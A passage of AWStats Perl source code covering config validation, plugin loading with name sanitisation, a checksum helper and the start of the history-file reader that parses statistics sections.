				  . join( ',', @{ $ExtraConditionTypeVal[$extranum] } ),
				2
			);
			debug(
				" ExtraFirstColumnFunction[$extranum] is array "
				  . join( ',', @{ $ExtraFirstColumnFunction[$extranum] } ),
				2
			);
			debug(
				" ExtraFirstColumnValuesType[$extranum] is array "
				  . join( ',', @{ $ExtraFirstColumnValuesType[$extranum] } ),
				2
			);
			debug(
				" ExtraFirstColumnValuesTypeVal[$extranum] is array "
				  . join( ',', @{ $ExtraFirstColumnValuesTypeVal[$extranum] } ),
				2
			);
		}
	}

	# Deny URLWithQueryWithOnlyFollowingParameters and URLWithQueryWithoutFollowingParameters both set
	if ( @URLWithQueryWithOnly && @URLWithQueryWithout ) {
		error( "URLWithQueryWithOnlyFollowingParameters and URLWithQueryWithoutFollowingParameters can't be both set at the same time"
		);
	}

	# Deny $ShowHTTPErrorsStats and $ShowSMTPErrorsStats both set
	if ( $ShowHTTPErrorsStats && $ShowSMTPErrorsStats ) {
		error( "ShowHTTPErrorsStats and ShowSMTPErrorsStats can't be both set at the same time"
		);
	}

  	# Deny LogFile if contains a pipe and PurgeLogFile || ArchiveLogRecords set on
	if ( ( $PurgeLogFile || $ArchiveLogRecords ) && $LogFile =~ /\|\s*$/ ) {
		error( "A pipe in log file name is not allowed if PurgeLogFile and ArchiveLogRecords are not set to 0"
		);
	}

	# If not a migrate, check if DirData is OK
	if ( !$MigrateStats && !-d $DirData ) {
		if ($CreateDirDataIfNotExists) {
			if ($Debug) { debug( " Make directory $DirData", 2 ); }
			my $mkdirok = mkdir "$DirData", 0755;
			if ( !$mkdirok ) {
				error( "$PROG failed to create directory DirData (DirData=\"$DirData\", CreateDirDataIfNotExists=$CreateDirDataIfNotExists)."
				);
			}
		}
		else {
			&Read_Language_Data($Lang);
			error( _t("Missing required parameter in config file") . " \"$PROG.$SiteConfig.conf\".\n"
				. _t("Please check that 'DirData' is defined.") );
		}
	}

	if ( $LogType eq 'S' ) { $NOTSORTEDRECORDTOLERANCE = 1000000; }
}

#------------------------------------------------------------------------------
# Function:     Common function used by init function of plugins
# Parameters:	AWStats version required by plugin
# Input:		$VERSION
# Output:		None
# Return: 		'' if ok, "Error: xxx" if error
#------------------------------------------------------------------------------
sub Check_Plugin_Version {
	my $PluginNeedAWStatsVersion = shift;
	if ( !$PluginNeedAWStatsVersion ) { return 0; }
	$VERSION =~ /^(\d+)\.(\d+)/;
	my $numAWStatsVersion = ( $1 * 1000 ) + $2;
	$PluginNeedAWStatsVersion =~ /^(\d+)\.(\d+)/;
	my $numPluginNeedAWStatsVersion = ( $1 * 1000 ) + $2;
	if ( $numPluginNeedAWStatsVersion > $numAWStatsVersion ) {
		return "Error: AWStats version $PluginNeedAWStatsVersion or higher is required. Detected $VERSION.";
	}
	return '';
}

#------------------------------------------------------------------------------
# Function:     Return a checksum for an array of string
# Parameters:	Array of string
# Input:		None
# Output:		None
# Return: 		Checksum number
#------------------------------------------------------------------------------
sub CheckSum {
	my $string   = shift;
	my $checksum = 0;

	#	use MD5;
	# 	$checksum = MD5->hexhash($string);
	my $i = 0;
	my $j = 0;
	while ( $i < length($string) ) {
		my $c = substr( $string, $i, 1 );
		$checksum += ( ord($c) << ( 8 * $j ) );
		if ( $j++ > 3 ) { $j = 0; }
		$i++;
	}
	return $checksum;
}

#------------------------------------------------------------------------------
# Function:     Load plugins files
# Parameters:	None
# Input:		$DIR @PluginsToLoad
# Output:		None
# Return: 		None
#------------------------------------------------------------------------------
sub Read_Plugins {

	# Check plugin files in common possible directories :
	# Windows and standard package:        		"$DIR/plugins" (plugins in same dir than awstats.pl)
	# Redhat :                                  "/usr/local/awstats/wwwroot/cgi-bin/plugins"
	# Debian package :                    		"/usr/share/awstats/plugins"
	my @PossiblePluginsDir = (
		"$DIR/plugins",
		"/usr/local/awstats/wwwroot/cgi-bin/plugins",
		"/usr/share/awstats/plugins"
	);
	my %DirAddedInINC = ();

	#Removed for security reason
	#foreach my $key (keys %NoLoadPlugin) { if ($NoLoadPlugin{$key} < 0) { push @PluginsToLoad, $key; } }
	if ($Debug) {
		debug(
			"Call to Read_Plugins with list: " . join( ',', @PluginsToLoad ) );
	}
	foreach my $plugininfo (@PluginsToLoad) {
		my ( $pluginfile, $pluginparam ) = split( /\s+/, $plugininfo, 2 );
		$pluginparam ||=
		  "";    # If split has only on part, pluginparam is not initialized
		$pluginfile =~ s/\.pm$//i;
		$pluginfile =~ /([^\/\\]+)$/;
		$pluginfile = Sanitize($1);     # pluginfile is cleaned from any path for security reasons and from .pm
		my $pluginname = $pluginfile;
		if ( $NoLoadPlugin{$pluginname} && $NoLoadPlugin{$pluginname} > 0 ) {
			if ($Debug) {
				debug( " Plugin load for '$pluginfile' has been disabled from parameters"
				);
			}
			next;
		}
		if ($pluginname) {
			if ( !$PluginsLoaded{'init'}{"$pluginname"} )
			{                   # Plugin not already loaded
				my %pluginisfor = (
					'timehires'            => 'u',
					'ipv6'                 => 'u',
					'hashfiles'            => 'u',
					'geoipfree'            => 'u',
					'geoip'                => 'ou',
					'geoip6'               => 'ou',
					'geoip2_country'       => 'ou',
					'geoip_region_maxmind' => 'mou',
					'geoip_city_maxmind'   => 'mou',
					'geoip2_city'          => 'mou',
					'geoip_isp_maxmind'    => 'mou',
					'geoip_org_maxmind'    => 'mou',
					'timezone'             => 'ou',
					'decodeutfkeys'        => 'o',
					'hostinfo'             => 'o',
					'rawlog'               => 'o',
					'userinfo'             => 'o',
					'urlalias'             => 'o',
					'tooltips'             => 'o',
					'localdate'            => 'o'
				);
				if ( $pluginisfor{$pluginname} )
				{    # If it's a known plugin, may be we don't need to load it
					 # Do not load "menu handler plugins" if output only and mainleft frame
					if (   !$UpdateStats
						&& scalar keys %HTMLOutput
						&& $FrameName eq 'mainleft'
						&& $pluginisfor{$pluginname} !~ /m/ )
					{
						$PluginsLoaded{'init'}{"$pluginname"} = 1;
						next;
					}

					# Do not load "update plugins" if output only
					if (   !$UpdateStats
						&& scalar keys %HTMLOutput
						&& $pluginisfor{$pluginname} !~ /o/ )
					{
						$PluginsLoaded{'init'}{"$pluginname"} = 1;
						next;
					}

					# Do not load "output plugins" if update only
					if (   $UpdateStats
						&& !scalar keys %HTMLOutput
						&& $pluginisfor{$pluginname} !~ /u/ )
					{
						$PluginsLoaded{'init'}{"$pluginname"} = 1;
						next;
					}
				}

				# Load plugin
				foreach my $dir (@PossiblePluginsDir) {
					my $searchdir = $dir;
					if (   $searchdir
						&& ( !( $searchdir =~ /\/$/ ) )
						&& ( !( $searchdir =~ /\\$/ ) ) )
					{
						$searchdir .= "/";
					}
					my $pluginpath = "${searchdir}${pluginfile}.pm";
					if ( -s "$pluginpath" ) {
						$PluginDir = "${searchdir}";    # Set plugin dir
						if ($Debug) {
							debug( " Try to init plugin '$pluginname' ($pluginpath) with param '$pluginparam'",
								1
							);
						}
						if ( !$DirAddedInINC{"$dir"} ) {
							push @INC, "$dir";
							$DirAddedInINC{"$dir"} = 1;
						}
						my $loadret = 0;
						my $modperl = $ENV{"MOD_PERL"}
						  ? eval {
							require mod_perl;
							$mod_perl::VERSION >= 1.99 ? 2 : 1;
						  }
						  : 0;
						if ( $modperl == 2 ) {
							$loadret = require "$pluginpath";
						}
						else { $loadret = require "$pluginfile.pm"; }
						if ( !$loadret || $loadret =~ /^error/i ) {

							# Load failed, we stop here
							error( "Plugin load for plugin '$pluginname' failed with return code: $loadret"
							);
						}
						my $ret;    # To get init return
						my $initfunction =
						  "\$ret=Init_$pluginname('$pluginparam')";		# Note that pluginname and pluginparam were sanitized when reading cong file entry 'LoadPlugin'
						my $initret = eval("$initfunction");
						if ( $initret && $initret eq 'xxx' ) {
							$initret = 'Error: The PluginHooksFunctions variable defined in plugin file does not contain list of hooked functions';
						}
						if ( !$initret || $initret =~ /^error/i ) {

							# Init function failed, we stop here
							error( "Plugin init for plugin '$pluginname' failed with return code: "
								  . (
									$initret
									? "$initret"
									: "$@ (A module required by plugin might be missing)."
								  )
							);
						}

						# Plugin load and init successful
						foreach my $elem ( split( /\s+/, $initret ) ) {

							# Some functions can only be plugged once
							my @uniquefunc = (
								'GetCountryCodeByName',
								'GetCountryCodeByAddr',
								'ChangeTime',
								'GetTimeZoneTitle',
								'GetTime',
								'SearchFile',
								'LoadCache',
								'SaveHash',
								'ShowMenu'
							);
							my $isuniquefunc = 0;
							foreach my $function (@uniquefunc) {
								if ( "$elem" eq "$function" ) {

									# We try to load a 'unique' function, so we check and stop if already loaded
									foreach my $otherpluginname (
										keys %{ $PluginsLoaded{"$elem"} } )
									{
										error( "Conflict between plugin '$pluginname' and '$otherpluginname'. They both implements the 'must be unique' function '$elem'.\nYou must choose between one of them. Using together is not possible."
										);
									}
									$isuniquefunc = 1;
									last;
								}
							}
							if ($isuniquefunc) {

			   # TODO Use $PluginsLoaded{"$elem"}="$pluginname"; for unique func
								$PluginsLoaded{"$elem"}{"$pluginname"} = 1;
							}
							else { $PluginsLoaded{"$elem"}{"$pluginname"} = 1; }
							if ( "$elem" =~ /SectionInitHashArray/ ) {
								$AtLeastOneSectionPlugin = 1;
							}
						}
						$PluginsLoaded{'init'}{"$pluginname"} = 1;
						if ($Debug) {
							debug( " Plugin '$pluginname' now hooks functions '$initret'",
								1
							);
						}
						last;
					}
				}
				if ( !$PluginsLoaded{'init'}{"$pluginname"} ) {
					error( "AWStats config file contains a directive to load plugin \"$pluginname\" (LoadPlugin=\"$plugininfo\") but AWStats can't open plugin file \"$pluginfile.pm\" for read.\nCheck if file is in \""
						  . ( $PossiblePluginsDir[0] )
						  . "\" directory and is readable." );
				}
			}
			else {
				warning( "Warning: Tried to load plugin \"$pluginname\" twice. Fix config file."
				);
			}
		}
		else {
			error("Plugin \"$pluginfile\" is not a valid plugin name.");
		}
	}
}

#------------------------------------------------------------------------------
# Function:     Read history file and create/update temporary history file
# Parameters:   year, month, day, hour, withupdate, withpurge, part_to_load,
#               [lastlinenb, lastlineoffset, lastlinechecksum]
# Input:        Global configs: $DirData, $PROG, $FileSuffix, $DatabaseBreak,
#               $BuildHistoryFormat, $SectionsToBeSaved, $UpdateStats, $MigrateStats
# Output:       Modifies global data structures (%DayPages, %_host_h, %_session, 
#               %_url_p, etc.) and creates temp file in $DirData
# Return:       Temp filename (if withupdate=1) or empty string
# Note:         Handles history files back to version 5.0, calls error() on corruption
#------------------------------------------------------------------------------
sub Read_History_With_TmpUpdate {

	my $year  = sprintf( "%04i", shift || 0 );
	my $month = sprintf( "%02i", shift || 0 );
	my $day   = shift;
	if ( $day ne '' ) { $day = sprintf( "%02i", $day ); }
	my $hour = shift;
	if ( $hour ne '' ) { $hour = sprintf( "%02i", $hour ); }
	my $withupdate = shift || 0;
	my $withpurge  = shift || 0;
	my $part       = shift || '';

	my ( $date, $filedate ) = ( '', '' );
	if ( $DatabaseBreak eq 'month' ) {
		$date     = sprintf( "%04i%02i", $year,  $month );
		$filedate = sprintf( "%02i%04i", $month, $year );
	}
	elsif ( $DatabaseBreak eq 'year' ) {
		$date     = sprintf( "%04i%", $year );
		$filedate = sprintf( "%04i",  $year );
	}
	elsif ( $DatabaseBreak eq 'day' ) {
		$date     = sprintf( "%04i%02i%02i", $year,  $month, $day );
		$filedate = sprintf( "%02i%04i%02i", $month, $year,  $day );
	}
	elsif ( $DatabaseBreak eq 'hour' ) {
		$date     = sprintf( "%04i%02i%02i%02i", $year,  $month, $day, $hour );
		$filedate = sprintf( "%02i%04i%02i%02i", $month, $year,  $day, $hour );
	}

	my $xml   = ( $BuildHistoryFormat eq 'xml' ? 1 : 0 );
	my $xmleb = '</table><nu>';
	my $xmlrb = '<tr><td>';

	my $lastlinenb       = shift || 0;
	my $lastlineoffset   = shift || 0;
	my $lastlinechecksum = shift || 0;

	my %allsections = (
		'general'               => 1,
		'protocol'              => 2,
		'time'                  => 3,
		'visitor'               => 4,
		'day'                   => 5,
		'domain'                => 6,
		'cluster'               => 7,
		'login'                 => 8,
		'robot'                 => 9,
		'worms'                 => 10,
		'emailsender'           => 11,
		'emailreceiver'         => 12,
		'session'               => 13,
		'sider'                 => 14,
		'filetypes'             => 15,
		'downloads'				=> 16,
		'os'                    => 17,
		'browser'               => 18,
		'screensize'            => 19,
		'unknownreferer'        => 20,
		'unknownrefererbrowser' => 21,
		'origin'                => 22,
		'sereferrals'           => 23,
		'pagerefs'              => 24,
		'searchwords'           => 25,
		'keywords'              => 26,
		'errors'                => 27,
		'filesize'              => 28,
		'requesttime'           => 29,
		'iconstatus'            => 30,
		'device'                => 31,
	);

	my $order = ( scalar keys %allsections ) + 1;
	foreach ( keys %TrapInfosForHTTPErrorCodes ) {
		$allsections{"sider_$_"} = $order++;
	}
	foreach ( 1 .. @ExtraName - 1 ) { $allsections{"extra_$_"} = $order++; }
	foreach ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) {
		$allsections{"plugin_$_"} = $order++;
	}
	my $withread = 0;

	# Variable used to read old format history files
	my $readvisitorforbackward = 0;

	if ($Debug) {
		debug( "Call to Read_History_With_TmpUpdate [$year,$month,$day,$hour,withupdate=$withupdate,withpurge=$withpurge,part=$part,lastlinenb=$lastlinenb,lastlineoffset=$lastlineoffset,lastlinechecksum=$lastlinechecksum]"
		);
	}
	if ($Debug) { debug("date=$date"); }

	# Define SectionsToLoad (which sections to load)
	my %SectionsToLoad = ();
	if ( $part eq 'all' ) {    # Load all needed sections
		my $order = 1;
		$SectionsToLoad{'general'} = $order++;

		# When
		$SectionsToLoad{'time'} = $order
		  ++; # Always loaded because needed to count TotalPages, TotalHits, TotalBandwidth
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowHostsStats ) || $HTMLOutput{'allhosts'} || $HTMLOutput{'lasthosts'} || $HTMLOutput{'unknownip'} )
		{
			$SectionsToLoad{'visitor'} = $order++;
		}     # Must be before day, sider and session section
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && ( $ShowDaysOfWeekStats || $ShowDaysOfMonthStats ) ) || $HTMLOutput{'alldays'} )
		{
			$SectionsToLoad{'day'} = $order++;
		}

		# Who
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowDomainsStats ) || $HTMLOutput{'alldomains'} )
		{
			$SectionsToLoad{'domain'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowAuthenticatedUsers ) || $HTMLOutput{'alllogins'} || $HTMLOutput{'lastlogins'} )
		{
			$SectionsToLoad{'login'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowRobotsStats ) || $HTMLOutput{'allrobots'} || $HTMLOutput{'lastrobots'} )
		{
			$SectionsToLoad{'robot'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowWormsStats ) || $HTMLOutput{'allworms'} || $HTMLOutput{'lastworms'} )
		{
			$SectionsToLoad{'worms'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowEMailSenders ) || $HTMLOutput{'allemails'} || $HTMLOutput{'lastemails'} )
		{
			$SectionsToLoad{'emailsender'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowEMailReceivers ) || $HTMLOutput{'allemailr'} || $HTMLOutput{'lastemailr'} )
		{
			$SectionsToLoad{'emailreceiver'} = $order++;
		}

		# Navigation
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowSessionsStats ) || $HTMLOutput{'sessions'} )
		{
			$SectionsToLoad{'session'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || ($HTMLOutput{'main'} && $ShowFileSizesStats) || $HTMLOutput{'filesizes'} )
		{
			$SectionsToLoad{'filesize'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowRequestTimesStats ) || $HTMLOutput{'requesttime'} )
		{
			$SectionsToLoad{'requesttime'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowPagesStats ) || $HTMLOutput{'urldetail'} || $HTMLOutput{'urlentry'} || $HTMLOutput{'urlexit'} )
		{
			$SectionsToLoad{'sider'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowFileTypesStats ) || $HTMLOutput{'filetypes'} )
		{
			$SectionsToLoad{'filetypes'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || ($HTMLOutput{'main'} && $ShowDownloadsStats ) || $HTMLOutput{'downloads'} )
		{
			$SectionsToLoad{'downloads'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowOSStats ) || $HTMLOutput{'osdetail'} )
		{
			$SectionsToLoad{'os'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowBrowsersStats ) || $HTMLOutput{'browserdetail'} )
		{
			$SectionsToLoad{'browser'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || $HTMLOutput{'unknownos'} ) {
			$SectionsToLoad{'unknownreferer'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || $HTMLOutput{'unknownbrowser'} ) {
			$SectionsToLoad{'unknownrefererbrowser'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowScreenSizeStats ) )
		{
			$SectionsToLoad{'screensize'} = $order++;
		}

		# Referers
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowOriginStats ) || $HTMLOutput{'origin'} )
		{
			$SectionsToLoad{'origin'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowOriginStats ) || $HTMLOutput{'refererse'} )
		{
			$SectionsToLoad{'sereferrals'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowOriginStats ) || $HTMLOutput{'refererpages'} )
		{
			$SectionsToLoad{'pagerefs'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowKeyphrasesStats ) || $HTMLOutput{'keyphrases'} || $HTMLOutput{'keywords'} )
		{
			$SectionsToLoad{'searchwords'} = $order++;
		}
		if ( !$withupdate && $HTMLOutput{'main'} && $ShowKeywordsStats ) {
			$SectionsToLoad{'keywords'} = $order++;
		}    
		# If we update, there is no need to load
		# Others
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowProtocolStats ) )
		{
			$SectionsToLoad{'protocol'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || $HTMLOutput{'main'} )
		{
			$SectionsToLoad{'iconstatus'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowDeviceTypesStats ) )
		{
			$SectionsToLoad{'device'} = $order++;
		}
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && ( $ShowHTTPErrorsStats || $ShowSMTPErrorsStats ) ) || $HTMLOutput{'errors'} )
		{
			$SectionsToLoad{'errors'} = $order++;
		}
		foreach ( keys %TrapInfosForHTTPErrorCodes ) {
			if ( $UpdateStats || $MigrateStats || $HTMLOutput{"errors$_"} ) { $SectionsToLoad{"sider_$_"} = $order++; } }
		if ( $UpdateStats || $MigrateStats || ( $HTMLOutput{'main'} && $ShowClusterStats ) ) { $SectionsToLoad{'cluster'} = $order++; }
		foreach ( 1 .. @ExtraName - 1 ) {
			if (   $UpdateStats
				|| $MigrateStats
				|| ( $HTMLOutput{'main'} && $ExtraStatTypes[$_] )
				|| $HTMLOutput{"allextra$_"} )
			{
				$SectionsToLoad{"extra_$_"} = $order++;
			}
		}
		foreach ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) {
			if ( $UpdateStats || $MigrateStats || $HTMLOutput{"plugin_$_"} ) {
				$SectionsToLoad{"plugin_$_"} = $order++;
			}
		}
	}
	else {    # Load only required sections
		my $order = 1;
		foreach ( split( /\s+/, $part ) ) { $SectionsToLoad{$_} = $order++; }
	}

	# Define SectionsToSave (which sections to save)
	my %SectionsToSave = ();
	if ($withupdate) {
		if ( $SectionsToBeSaved eq 'all' ) {
			%SectionsToSave = %allsections;
		}
		else {
			my $order = 1;
			foreach ( split( /\s+/, $SectionsToBeSaved ) ) {
				$SectionsToSave{$_} = $order++;
			}
		}
	}

	if ($Debug) {
		debug(
			" List of sections marked for load : "
			  . join(
				' ',
				(
					sort { $SectionsToLoad{$a} <=> $SectionsToLoad{$b} }
					  keys %SectionsToLoad
				)
			  ),
			2
		);
		debug(
			" List of sections marked for save : "
			  . join(
				' ',
				(
					sort { $SectionsToSave{$a} <=> $SectionsToSave{$b} }
					  keys %SectionsToSave
				)
			  ),
			2
		);
	}

	# Define value for filetowrite and filetoread (Month before Year kept for backward compatibility)
	my $filetowrite = '';
	my $filetoread  = '';
	if ( $HistoryAlreadyFlushed{"$year$month$day$hour"}
		&& -s "$DirData/$PROG$filedate$FileSuffix.tmp.$$" )
	{

		# tmp history file was already flushed
		$filetoread  = "$DirData/$PROG$filedate$FileSuffix.tmp.$$";
		$filetowrite = "$DirData/$PROG$filedate$FileSuffix.tmp.$$.bis";
	}
	else {
		$filetoread  = "$DirData/$PROG$filedate$FileSuffix.txt";
		$filetowrite = "$DirData/$PROG$filedate$FileSuffix.tmp.$$";
	}
	if ($Debug) { debug( " History file to read is '$filetoread'", 2 ); }

	# Is there an old data file to read or, if migrate, can we open the file for read
	if ( -s $filetoread || $MigrateStats ) { $withread = 1; }

	# Open files 
	# Avoid premature EOF due to history files corrupted with \cZ or bin chars
	if ($withread) {
		open( HISTORY, $filetoread ) || error( "Couldn't open file \"$filetoread\" for read: $!",
			"", "", $MigrateStats );
		binmode HISTORY;
	}
	if ($withupdate) {
		open( HISTORYTMP, ">$filetowrite" ) || error("Couldn't open file \"$filetowrite\" for write: $!");
		binmode HISTORYTMP;
		if ($xml) {
			print HISTORYTMP "<xml xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:noNamespaceSchemaLocation=\"$DirIcons/os/awstats.xsd\">\n";
		}
		Save_History( "header", $year, $month, $date );
	}

	# Loop on read file
	my $readxml = 0;
	if ($withread) {
		my $countlines = 0;
		my $versionnum = 0;
		my @field      = ();
		while (<HISTORY>) {
			chomp $_;
			s/\r//;
			$countlines++;

			# Test if it's xml
			if ( !$readxml && $_ =~ /^<xml/ ) {
				$readxml = 1;
				if ($Debug) { debug( " Data file format is 'xml'", 1 ); }
				next;
			}

			# Extract version from first line
			if ( !$versionnum && $_ =~ /^AWSTATS DATA FILE (\d+).(\d+)/i ) {
				$versionnum = ( $1 * 1000 ) + $2;
				if ($Debug) { debug( " Data file version is $versionnum", 1 ); }
				next;
			}

			# Analyze fields
			@field = split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
			if ( !$field[0] ) { next; }

			# Here version MUST be defined
			if ( $versionnum < 5000 ) { error( "History file '$filetoread' is to old (version '$versionnum'). This version of AWStats is not compatible with very old history files. Remove this history file or use first a previous AWStats version to migrate it from command line with command: $PROG.$Extension -migrate=\"$filetoread\".",
					"", "", 1
				);
			}

			# BEGIN_GENERAL
			# TODO Manage GENERAL in a loop like other sections.
			if ( $field[0] eq 'BEGIN_GENERAL' ) {
				if ($Debug) { debug(" Begin of GENERAL section"); }
				next;
			}
			if ( $field[0] eq 'LastLine' || $field[0] eq "${xmlrb}LastLine" ) {
				if ( !$LastLine || $LastLine < int( $field[1] ) ) {
					$LastLine = int( $field[1] );
				}
				if ( $field[2] ) { $LastLineNumber   = int( $field[2] ); }
				if ( $field[3] ) { $LastLineOffset   = int( $field[3] ); }
				if ( $field[4] ) { $LastLineChecksum = int( $field[4] ); }
				next;
			}
			if ( $field[0] eq 'FirstTime' || $field[0] eq "${xmlrb}FirstTime" )
			{
				if ( !$FirstTime{$date}
					|| $FirstTime{$date} > int( $field[1] ) )
				{
					$FirstTime{$date} = int( $field[1] );
				}
				next;
			}
			if ( $field[0] eq 'LastTime' || $field[0] eq "${xmlrb}LastTime" ) {
				if ( !$LastTime{$date} || $LastTime{$date} < int( $field[1] ) )
				{
					$LastTime{$date} = int( $field[1] );
				}
				next;
			}
			if (   $field[0] eq 'LastUpdate'
				|| $field[0] eq "${xmlrb}LastUpdate" )
			{
				if ( !$LastUpdate ) { $LastUpdate = int( $field[1] ); }
				next;
			}
			if (   $field[0] eq 'TotalVisits'
				|| $field[0] eq "${xmlrb}TotalVisits" )
			{
				if ( !$withupdate ) {
					$MonthVisits{ $year . $month } += int( $field[1] );
				}
				next;
			}
			if (   $field[0] eq 'TotalUnique'
				|| $field[0] eq "${xmlrb}TotalUnique" )
			{
				if ( !$withupdate ) {
					$MonthUnique{ $year . $month } += int( $field[1] );
				}
				next;
			}
			if (   $field[0] eq 'MonthHostsKnown'
				|| $field[0] eq "${xmlrb}MonthHostsKnown" )
			{
				if ( !$withupdate ) {
					$MonthHostsKnown{ $year . $month } += int( $field[1] );
				}
				next;
			}
			if (   $field[0] eq 'MonthHostsUnknown'
				|| $field[0] eq "${xmlrb}MonthHostsUnknown" )
			{
				if ( !$withupdate ) {
					$MonthHostsUnknown{ $year . $month } += int( $field[1] );
				}
				next;
			}
			if (
				(
					   $field[0] eq 'END_GENERAL'
					|| $field[0] eq "${xmleb}END_GENERAL"
				)
			  )
			{
				if ($Debug) { debug(" End of GENERAL section"); }
				if ( $MigrateStats && !$BadFormatWarning{ $year . $month } ) {
					$BadFormatWarning{ $year . $month } = 1;
					warning( "Warning: You are migrating a file that is already a recent version (migrate not required for files version $versionnum).",
						"", "", 1
					);
				}

				delete $SectionsToLoad{'general'};
				if ( $SectionsToSave{'general'} ) {
					Save_History( 'general', $year, $month, $date, $lastlinenb,
						$lastlineoffset, $lastlinechecksum );
					delete $SectionsToSave{'general'};
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_FILESIZE
			if ( $field[0] eq 'BEGIN_FILESIZE' ) {
					if ($Debug) { debug(" Begin of FILESIZE section"); }
					$field[0] = '';
					my $count = 0;
					my $countloaded = 0;
					do {
							if ( $field[0] ) {
									$count++;
									if ( $SectionsToLoad{'filesize'} ) {
											$countloaded++;
											if ($field[1]) {
													$_filesize{ $field[0] } += $field[1];
											}
									}
							}
							$_ = <HISTORY>;
							chomp $_;
							s/\r//;
							@field =
								split( /\s+/,
									( $readxml ? CleanFromTags($_) : $_) );
							$countlines++;
					} until ( $field[0] eq 'END_FILESIZE'
								|| $field[0] eq "${xmleb}END_FILESIZE"
								|| ! $_ );
					if (   $field[0] ne 'END_FILESIZE'
							&& $field[0] ne "${xmleb}END_FILESIZE")
					{
							error( "History file \"$filetoread\" is corrupted (End of section FILESIZE not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).","","",1
							);
					}
					if ($Debug) {
							debug( " End of FILESIZE section ($count entries, $countloaded loaded)"
							);
					}
					delete $SectionsToLoad{'filesize'};
					if ( !scalar %SectionsToLoad ) {
							debug(" Stop reading history file. Got all we need.");
							last;
					}
					next;
			}

			# BEGIN_REQUESTTIME
			if ( $field[0] eq 'BEGIN_REQUESTTIME' ) {
				if ($Debug) { debug(" Begin of REQUESTTIME section"); }
				$field[0] = '';
				my $count = 0;
				my $countloaded = 0;
				do {
						if ( $field[0] ) {
							$count++;
							if ( $SectionsToLoad{'requesttime'} ) {
									$countloaded++;
									if ( $field[1] ) {
											$_requesttime{ $field[0] } += $field[1];
									}                                                
							}
						}
						$_ = <HISTORY>;
						chomp $_;
						s/\r//;
						@field =
							split( /\s+/,
								( $readxml ? CleanFromTags($_) : $_) );
						$countlines++;
					} until ( $field[0] eq 'END_REQUESTTIME'
							|| $field[0] eq "${xmleb}END_REQUESTTIME"
							|| !$_ );
				if ( $field[0] ne 'END_REQUESTTIME'
						&& $field[0] ne "${xmleb}END_REQUESTTIME")
				{
						error( "History file \"$filetoread\" is corrupted (End of section REQUESTTIME not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
								"", "", 1
						);
				}
				if ($Debug) {
						debug( " End of _REQUESTTIME section ($count entries, $countloaded loaded)"
						);
				}
				delete $SectionsToLoad{'requesttime'};
				if ( !scalar %SectionsToLoad ) {
						debug(" Stop reading history file. Got all we need.");
						last;
				}
				next;
			}
			# BEGIN_PROTOCOL
			if ( $field[0] eq 'BEGIN_PROTOCOL' ) {
				if ($Debug) { debug(" Begin of PROTOCOL section"); }
				$field[0] = '';
				my $count = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'protocol'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_protocol_h{ $field[0] } += int( $field[1] );
							}
							if ( $field[2] ) {
								$_protocol_k{ $field[0] } += int( $field[2] );
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field = split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				} until ( $field[0] eq 'END_PROTOCOL' || $field[0] eq "${xmleb}END_PROTOCOL" || !$_ );
				if ( $field[0] ne 'END_PROTOCOL' && $field[0] ne "${xmleb}END_PROTOCOL" ) {
					error( "History file \"$filetoread\" is corrupted (End of section PROTOCOL not found)." );
				}
				if ($Debug) {
					debug( " End of PROTOCOL section ($count entries, $countloaded loaded)" );
				}
				delete $SectionsToLoad{'protocol'};
				if ( $SectionsToSave{'protocol'} ) {
					Save_History( 'protocol', $year, $month, $date );
					delete $SectionsToSave{'protocol'};
					if ($withpurge) {
